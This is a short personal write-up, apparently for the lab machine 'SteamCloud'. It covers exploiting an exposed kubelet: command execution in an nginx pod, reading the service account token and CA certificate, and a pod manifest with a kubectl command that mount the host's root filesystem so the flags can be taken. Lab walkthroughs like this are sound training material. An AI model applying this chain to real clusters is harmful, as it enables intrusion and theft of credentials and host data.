
2026-08-31 10:29

Tags: 

## SteamCloud

- ![](Pasted%20image%2020260831103308.png)
- Port 22, 8443
- Port 8443 reveals that Kubernetes is being used


- Go to port 10250 and the /pods endpoint, reveals that 8 pods are being used
- ![](Pasted%20image%2020260907103734.png)
- Use kubectl
- ![](Pasted%20image%2020260907110838.png)
- Use the `scan rce` command to check if RCE is available in any pod
- ![](Pasted%20image%2020260907111340.png)
- We can RCE in the `nginx` pod
- Use the run command to execute code remotely
- ![](Pasted%20image%2020260907111723.png)


- We can get the access token and the certificate inside a Kubernetes pod in `/var/run/secrets/kubernetes.io/serviceaccount/`
- ![](Pasted%20image%2020260907171905.png)
- Export the token as environmental variable, check if this standard user has any rights
- ![](Pasted%20image%2020260907174305.png)
- We can create new pods
- YAML file:
- apiVersion: v1
kind: Pod
metadata:
  name: nginxt
  namespace: default
spec:
  automountServiceAccountToken: true
  hostNetwork: true
  containers:
  - name: nginxt
    image: nginx:1.14.2
    volumeMounts:
    - name: mount-root-into-mnt
      mountPath: /root
  volumes:
  - name: mount-root-into-mnt
    hostPath:
      path: /

- This pod mount the  `/root` directory of the pod to the `/` directory of the host machine

- Command: `kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.53.84:8443 apply -f pod.yaml`
- ![](Pasted%20image%2020260907175314.png)
- Get the flags
## References:

